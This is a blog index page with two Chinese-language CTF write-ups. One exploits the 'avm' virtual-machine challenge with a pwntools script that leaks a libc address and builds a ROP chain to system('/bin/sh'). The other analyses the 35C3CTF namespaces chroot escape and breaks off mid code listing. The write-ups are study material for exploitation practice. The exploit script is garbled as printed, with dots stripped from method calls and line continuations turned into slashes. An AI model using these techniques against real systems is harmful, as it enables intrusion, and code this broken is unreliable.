<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="a2ure&#39;s blog">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="a2ure&#39;s blog">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="a2ure">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>a2ure's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">a2ure's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2026/02/07/%E9%95%BF%E5%9F%8E%E6%9D%AFavm%20wp/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="a2ure">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="a2ure's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2026/02/07/%E9%95%BF%E5%9F%8E%E6%9D%AFavm%20wp/" class="post-title-link" itemprop="url">长城杯avm wp</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2026-02-07 10:10:47" itemprop="dateCreated datePublished" datetime="2026-02-07T10:10:47+08:00">2026-02-07</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>1.8k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>7 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="一-前言"><a href="#一-前言" class="headerlink" title="一.前言"></a>一.前言</h2><p>​	本题主要是一个虚拟机的题，由于比赛时间并不是很长，因此这个题在逆向方面确实没有给大家过多的难度，利用原理也十分简单，由于虚拟机中load和store指令会读取或者存入栈中的一个数组，并且这个数组的长度不够长，导致攻击者可以任意地址写栈中0xfff大小的区域，因此可以泄露Libc并且通过rop实现攻击</p>
<h2 id="二-逆向一下结构体"><a href="#二-逆向一下结构体" class="headerlink" title="二.逆向一下结构体"></a>二.逆向一下结构体</h2><p>​	首先就是程序的入口main函数，他首先初始化，之后读取0x300长度的opcode。之后进入到sub_1230函数。</p>
<p><img src="/images/avm/image-20241216092601552.png" alt="image-20241216092601552"></p>
<p>​	这里面就是对于虚拟机中的寄存器进行初始化操作，首先a1是传入的一个bss的一个地址，然后这个题其实虚拟机的逆向难度也不复杂，直接看初始化和后面的run函数就可以分析出来，初始化的时候首先初始化了rip，然后以及opcode的指针和最后结束的指针，之后就是循环的初始化寄存器的值</p>
<p><img src="/images/avm/image-20241216092741025.png" alt="image-20241216092741025"></p>
<p>​	之后通过View -&gt; open subviews -&gt; local types里面加入对应结构体信息，然后把所有的指针都转换成结构体信息。</p>
<p><img src="/images/avm/image-20241216094335171.png" alt="image-20241216094335171">	</p>
<p>​	初始化结束之后就进入到了run的函数里面，首先就是开辟了s一个栈空间，用来作为后面load和store存取数据的位置，并且对其初始化，然后循环遍历解析opcode，和0xFFFFFFFFFFFFFFFCLL取&amp;主要是为了后面的值是4的倍数，说明这个虚拟机时一个32位的虚拟机，之后进入到对应的注册函数中取根据opcode的28位的值。</p>
<p><img src="/images/avm/image-20241216092949466.png" alt="image-20241216092949466"></p>
<p>​	这里可以看到逆向之后的结果如下，就是简单的几个寄存器的功能。进入到具体的函数中，因为之前已经恢复了结构体的信息，所以进入函数之后很清楚的可以看到具体的内容。</p>
<p><img src="/images/avm/image-20241216093936842.png" alt="image-20241216093936842"></p>
<p>​	简单以store指令作为例子来解释，首先读取v3，也就是当前执行的opcode的值，之后取出右边移位5之后取出来的值对应的寄存器的值，加上右移十六位之后的opcdoe值相加，len是个固定的也就是0xff，所以这里面我的做法就是控制前面寄存器为1也就是v3 &gt;&gt; 5为1，这样由于之前清理过寄存器的值，所以我们只需要控制v3的十六位的值就可以控制整个值的内容，之后进入到If语句里面就简单的时读取传入a2也就是栈里面的值，然后把opcode最低位的对应的寄存器里面值赋值给栈中。</p>
<p><img src="/images/avm/image-20241216094621553.png" alt="image-20241216094621553"></p>
<p>​	其他所有的函数都大差不差，按照上面的思路都可以进行逆向。后面Load函数ida逆向的有点奇怪，但是实际上看一下汇编就可以看明白了，通过移位其实也就是一个字节一个字节的取赋值，因此ida逆向出来对于寄存器赋值的操作这么奇怪，在做题的时候完全可以把store反过来看就可以了。</p>
<p><img src="/images/avm/image-20241216095633714.png" alt="image-20241216095633714"></p>
<h2 id="三-漏洞利用"><a href="#三-漏洞利用" class="headerlink" title="三.漏洞利用"></a>三.漏洞利用</h2><p>​	经过上面的阐述其实也都直到漏洞的问题所在了，具体的利用思路就是通过load指令读取栈中的一些地址，比如libc中函数的地址，通过sub, add指令的功能减去偏移（这部分最开始思路想歪了，一直想着输出出来，但是其实把基地址算出来存在寄存器里面也一样）,获得到偏移之后就是利用system(“&#x2F;bin&#x2F;sh”)来执行命令，需要注意的是，这里面栈布局很神奇，在做题的时候发现很多Libc的地址根据s也就是栈中变量的偏移不固定，可以往远处找一找，比如后面的libc_start_main函数就可以了。</p>
<p>​	因此就是按照上述的思路来撰写代码，首先把需要用的几个指令封装一下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">operation</span>(<span class="params">opcode, i, j, k</span>):</span><br><span class="line">    <span class="keyword">return</span> p32((opcode &lt;&lt; <span class="number">28</span>) + (i &lt;&lt; <span class="number">5</span>) + (j &lt;&lt; <span class="number">16</span>) + k)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">i, j, k</span>):</span><br><span class="line">    <span class="keyword">return</span> operation(<span class="number">1</span>, i, j, k)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub</span>(<span class="params">i, j, k</span>):</span><br><span class="line">    <span class="keyword">return</span> operation(<span class="number">2</span>, i, j, k)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">store</span>(<span class="params">i, j, k</span>):</span><br><span class="line">    <span class="keyword">return</span> operation(<span class="number">9</span>, i, j, k)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>(<span class="params">i, j, k</span>):</span><br><span class="line">    <span class="keyword">return</span> operation(<span class="number">10</span>, i, j, k)</span><br></pre></td></tr></table></figure>

<p>​	之后就是选择读取栈中的值，我们可以定位在b *$rebase(0x19ea)这里，根据rsi指向的地址来往后面查，这里需要注意我之前说的内容，在0x500左右的地址会出现libc的函数地址，但是会发现这个偏移不固定，还要爆破，因此我们可以继续往下面找，直到找到libc_start_main函数这里</p>
<p><img src="/images/avm/image-20241216101845864.png" alt="image-20241216101845864"></p>
<p>​	这里的位置是0xd68，然后减去rsi和对应的偏移0x30就是我们后面写的位置0xd38了，这样我们就存了libc_start_main函数的地址了，后面就是利用寄存器sub掉和libc基地址的偏移，之后加上pop_rdi binash ret system等地址就可以了</p>
<p>​	这里再利用的时候需要注意，和常见的64位程序一样需要加一个ret，要么地址不是被0x10整除的会报错最终的exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;/pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;123562999&quot;, 32801)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/libcso6&quot;</span>)</span><br><span class="line">libc_start_main = <span class="number">0x29d90</span></span><br><span class="line">pop_rdi = <span class="number">0x2a3e5</span></span><br><span class="line">ret = <span class="number">0x29139</span></span><br><span class="line">system = <span class="number">0x50d70</span></span><br><span class="line">binsh = <span class="built_in">next</span>(libcsearch(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">operation</span>(<span class="params">opcode, i, j, k</span>):</span><br><span class="line">    <span class="keyword">return</span> p32((opcode &lt;&lt; <span class="number">28</span>) + (i &lt;&lt; <span class="number">5</span>) + (j &lt;&lt; <span class="number">16</span>) + k)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">i, j, k</span>):</span><br><span class="line">    <span class="keyword">return</span> operation(<span class="number">1</span>, i, j, k)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub</span>(<span class="params">i, j, k</span>):</span><br><span class="line">    <span class="keyword">return</span> operation(<span class="number">2</span>, i, j, k)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">store</span>(<span class="params">i, j, k</span>):</span><br><span class="line">    <span class="keyword">return</span> operation(<span class="number">9</span>, i, j, k)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>(<span class="params">i, j, k</span>):</span><br><span class="line">    <span class="keyword">return</span> operation(<span class="number">10</span>, i, j, k)</span><br><span class="line"></span><br><span class="line">opcode = load(<span class="number">1</span>, <span class="number">0xd38</span>, <span class="number">4</span>) + load(<span class="number">1</span>, <span class="number">0x160</span>, <span class="number">5</span>) + /</span><br><span class="line">         sub(<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>) + load(<span class="number">1</span>, <span class="number">0x168</span>, <span class="number">7</span>) + /</span><br><span class="line">         add(<span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>) + load(<span class="number">1</span>, <span class="number">0x170</span>, <span class="number">9</span>) + /</span><br><span class="line">         add(<span class="number">6</span>, <span class="number">9</span>, <span class="number">10</span>) + load(<span class="number">1</span>, <span class="number">0x178</span>, <span class="number">11</span>) + /</span><br><span class="line">         add(<span class="number">6</span>, <span class="number">11</span>, <span class="number">12</span>) + load(<span class="number">1</span>, <span class="number">0x180</span>, <span class="number">13</span>) + /</span><br><span class="line">         add(<span class="number">6</span>, <span class="number">13</span>, <span class="number">14</span>) + store(<span class="number">1</span>, <span class="number">0x118</span>, <span class="number">8</span>) + /</span><br><span class="line">         store(<span class="number">1</span>, <span class="number">0x120</span>, <span class="number">10</span>) + store(<span class="number">1</span>, <span class="number">0x128</span>, <span class="number">12</span>) + /</span><br><span class="line">         store(<span class="number">1</span>, <span class="number">0x130</span>, <span class="number">14</span>) + p32(<span class="number">0</span>) + /</span><br><span class="line">         p64(libc_start_main) + p64(pop_rdi) + /</span><br><span class="line">         p64(binsh) + p64(ret) + p64(system)</span><br><span class="line"></span><br><span class="line">iosend(opcode)</span><br><span class="line">iorecvuntil(<span class="string">b&#x27;opcode: Unsupported instruction/n&#x27;</span>)</span><br><span class="line">iointeractive()</span><br></pre></td></tr></table></figure>

<p>​	这里可以观察到我再store之后存入了一个p32(0)这个其实是为了让地址更完整，要么读取数据的时候会发现有其他数据干扰，之后对于load和store第一个参数都是1也是就是我们之前说的，需要找一个固定寄存器内容位0的寄存器，这样我们只需要控制第二个的内容就可以控制寄存器的值了。</p>
<h2 id="四-总结"><a href="#四-总结" class="headerlink" title="四.总结"></a>四.总结</h2><p>​	自此基本完成了所有对于avm原理的阐述，这个题目其实逆向难度不大，当时比赛过程中主要就是一直最开始想着输出基地址一度卡住了，之后也是被随便找到libc函数地址和栈地址偏移随机这个问题给困扰很久，但是通过这个题目也是学到了很多的东西，对于vm这种虚拟机的题目也有了更进一步的了解，希望后面可以争取加快逆向时的速度以及减少掉入一些缺乏经验的错误。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2026/02/07/35C3CTF-namespace/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="a2ure">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="a2ure's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2026/02/07/35C3CTF-namespace/" class="post-title-link" itemprop="url">35C3CTF-namespace</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2026-02-07 10:10:47" itemprop="dateCreated datePublished" datetime="2026-02-07T10:10:47+08:00">2026-02-07</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Container-security/" itemprop="url" rel="index"><span itemprop="name">Container security</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>5.3k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>19 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="namespace的flag解释"><a href="#namespace的flag解释" class="headerlink" title="namespace的flag解释"></a>namespace的flag解释</h3><ul>
<li><strong>mnt namespaces</strong>，mount的结果不会影响其他mnt namespaces中的进程</li>
<li><strong>cgroup namespaces</strong>，cgroup用于限制进程对cpu等系统资源的使用</li>
<li><strong>uts namespaces</strong>，隔离hostname和NIS域名</li>
<li><strong>ipc namespaces</strong>，隔离消息队列、信号量和共享内存3钟进程间通信的方式，并不会限制其他的ipc通信</li>
<li><strong>user namespaces</strong>，同一个用户在不同的user namespaces中可以对应不同的uid，一个user namespaces中的普通用户甚至可以是另一个user namespaces中的root用户。此外，新建或加入一个user namespaces时，无论新的uid是多少，能够在这个user namespaces中获取到全部的capabilities，不过需要注意如果uid不为0的话执行execve等函数后capabilities会全部丢失掉</li>
<li><strong>pid namespaces</strong>，隔离进程的pid，创建新的pid namespaces后，外层的pid namespaces可以看到里面的进程，而里面的进程无法看到外面的进程</li>
<li><strong>net namespaces</strong>，隔离网络相关的资源，比如ip协议栈、路由表等等，此外它还会隔离unix域的abstract socket，这点在后面也会用到</li>
<li><strong>time namespaces</strong>, 隔离系统时间，进程在不同命名空间中可以看到不同的系统时间。</li>
</ul>
<h3 id="socket-AF-UNIX通信"><a href="#socket-AF-UNIX通信" class="headerlink" title="socket AF_UNIX通信"></a>socket AF_UNIX通信</h3><ul>
<li><strong>pathname</strong>，指的是用bind将socket绑定到一个具体的文件名上去，这里因为chroot的限制无法使用</li>
<li><strong>unnamed</strong>，没有用bind绑定的stream socket都是unnamed的，上面socketpair创建的也是。在这种两个进程分别创建socket的情况下是当作客户端去使用</li>
<li><strong>abstract</strong>，用bind将socket绑定到一个与文件系统无关的名字上去，由net namespaces进行隔离</li>
</ul>
<h2 id="题目部署"><a href="#题目部署" class="headerlink" title="题目部署"></a>题目部署</h2><p>​	本题比较经典，网上描述漏洞成因的时候有几个文章，但是在自己复现的时候发现存在一些问题。首先对于题目环境来说可以通过<a target="_blank" rel="noopener" href="https://github.com/LevitatingLion/ctf-writeups/tree/master/35c3ctf/pwn_namespaces">链接</a>进行访问。之后利用下面这个命令来启用镜像</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --privileged -v /sys/fs/cgroup:/sys/fs/cgroup:rw -v /flag:/flag -p 1337:1337 namespace</span><br></pre></td></tr></table></figure>

<p>​	需要注意我是用ubuntu 22.04的机器去复现的，但是在复现过程中发现，ubuntu使用的时cgroupv2，而这个环境复现的需要时发现如果使用v2版本会找不到cpu memery pids等文件夹，因此需要切换回v1版本，因此需要执行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/default/grub</span><br><span class="line">GRUB_CMDLINE_LINUX=<span class="string">&quot;cgroup_enable=memory swapaccount=0 systemd.unified_cgroup_hierarchy=0&quot;</span> </span><br></pre></td></tr></table></figure>

<p>​	之后使用下面命令就可以重新启动机器并且切换回v1版本</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> update-grub</span><br><span class="line"><span class="built_in">sudo</span> reboot</span><br></pre></td></tr></table></figure>

<p>​	执行成功后会显示如下信息</p>
<p><img src="/images/namespace/1735395811009.jpg" alt="1735395811009"></p>
<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>​	首先就是对于题目中的Dockerfile进行分析，内容如下：</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> tsuro/nsjail</span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> challenge/namespaces /home/user/chal</span></span><br><span class="line"><span class="comment">#COPY tmpflag /flag</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> /bin/sh -c <span class="string">&quot;/usr/bin/setup_cgroups.sh &amp;&amp; cp /flag /tmp/flag &amp;&amp; chmod 400 /tmp/flag &amp;&amp; chown user /tmp/flag &amp;&amp; su user -c &#x27;/usr/bin/nsjail -Ml --port 1337 --chroot / -R /tmp/flag:/flag -T /tmp --proc_rw -U 0:1000:1 -U 1:100000:1 -G 0:1000:1 -G 1:100000:1 --keep_caps --cgroup_mem_max 209715200 --cgroup_pids_max 100 --cgroup_cpu_ms_per_sec 100 --rlimit_as max --rlimit_cpu max --rlimit_nofile max --rlimit_nproc max -- /usr/bin/stdbuf -i0 -o0 -e0 /usr/bin/maybe_pow.sh /home/user/chal&#x27;&quot;</span></span></span><br></pre></td></tr></table></figure>

<p>​	实际上可以看出就是利用了nsjail进行创建了一个虚拟环境来执行我们的namespaces文件，并且将docker的1000号用户(user)映射为了nsjail中的0号用户(root)，将docker中的10000号用户(nobody)映射为了nsjail中的1号用户(nobody)。并且把flag文件放到了tmp目录下，用docker中的user用户权限，也就是nsjail的root用户权限来进行执行。</p>
<p><img src="/images/namespace/1735436713608.jpg" alt="1735436713608"></p>
<p>​	接下来就是分析main函数，进入到main函数中发现本体并没有去掉符号表因此还是比较人性的，可以看到主要就是两个函数，start_sandbox和run_elf两个函数，通过用户输入选项来进行选择，之后便是先进入到start_sandbox函数里面</p>
<p><img src="/images/namespace/1735436872947.jpg" alt="1735436872947"></p>
<p>​	在函数内部，通过 socketpair 创建了一个双向管道，方便父进程与子进程之间进行通信。接着，利用 new_proc 创建子进程，并关闭不必要的文件描述符。首先，获取 ELF 文件，并通过 setgroups 等操作修改进程的特权和用户&#x2F;组映射，以调整进程的权限和身份。随后，使用 chroot 命令将进程的根目录设置为 &#x2F;tmp&#x2F;chroot&#x2F;*，从而隔离进程，避免访问其他文件系统中的数据。最后，子进程等待父进程关闭 setgroups 等权限，确保在执行 ELF 文件时无法修改或干扰其操作。</p>
<p><img src="/images/namespace/1735437325702.jpg" alt="1735437325702"></p>
<p>​	这里说明一下new_proc函数，他其实是调用了clone函数，其中的0x7E020000LLflag其实是下面的拆解</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clone syscall,<span class="number">0x7E020000</span>=CLONE_NEWNS|CLONE_NEWCGROUP|CLONE_NEWUTS|CLONE_NEWIPC|CLONE_NEWUSER|CLONE_NEWPID|CLONE_NEWNET</span><br></pre></td></tr></table></figure>

<p>​	之后便是run_elf这个函数，这里面功能比较简单，首先就是获取之前start_sandbox里面的沙盒，之后fork一个子进程，利用change_ns把子进程的namespace切换成和沙盒里面的环境一样的namespace中，之后执行。</p>
<p><img src="/images/namespace/1735437995398.jpg" alt="1735437995398"></p>
<p>​	进入到change_ns里面可以看到，首先就是一个循环，打开父进程的&#x2F;proc&#x2F;self&#x2F;ns目录下的namespace，利用setns函数切换过去，并且对于pid namespace进行了特殊处理，原因就是pid命名空间比较特殊，当前进程的pid命名空间并不会改变，只有子进程的才会进入到pid namespace中</p>
<p><img src="/images/namespace/1735438143643.jpg" alt="1735438143643"></p>
<p>​	最后就是看一下NSS变量，其实就是一个数组，通过循环回按照顺序一次执行user, mnt, pid, uts, ipc, cgroup的namespace设置，通过这里就可以发现，少了net的namespcae设置，因此在namespace下的elf中程序可以和其他的namespace下的程序进行通信，也就是本题逃逸chroot的漏洞方法</p>
<p><img src="/images/namespace/1735438406556.jpg" alt="1735438406556"></p>
<p>​	自此本题的逻辑也就分析完了，其实由于符号表都在，所以其实可以很清楚的看出对应函数执行的逻辑，我们通过对应他net namespace的缺少限制，可以对其进一步的利用</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="chroot逃逸"><a href="#chroot逃逸" class="headerlink" title="chroot逃逸"></a>chroot逃逸</h3><p>​	漏洞利用的方法就是和我们之前所说的socket通信有关，首先需要了解到的是，在linux中有一些函数是带有at的api，他们可以通过一个文件描述符加基于该文件描述符对应文件的相对路径来获得最终的文件路径，而非传统上直接由调用者给出字符串参数指定，比如下面这几个</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">openat</span><span class="params">(<span class="type">int</span> dirfd, <span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">int</span> flags)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">unlinkat</span><span class="params">(<span class="type">int</span> dirfd, <span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">int</span> flags)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">symlinkat</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *target, <span class="type">int</span> newdirfd, <span class="type">const</span> <span class="type">char</span> *linkpath)</span>;</span><br></pre></td></tr></table></figure>

<p>​	因此，如果我们在一个沙盒中的程序（比如root目录在&#x2F;tmp&#x2F;chroot&#x2F;1）的程序，发送一个fd给另一个沙盒中的程序（root目录在&#x2F;tmp&#x2F;chroot&#x2F;2）,那么我们就可以通过相对路径逃逸出chroot的限制，但是需要考虑的是如何发送一个fd给在不同namespace下的程序呢。这里需要注意的是，对于clone来说，会把fd一同复制给子进程，并且经过实验，如下代码可以看到，经过各种flag标志的namespace都不会影响fd的传递。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span 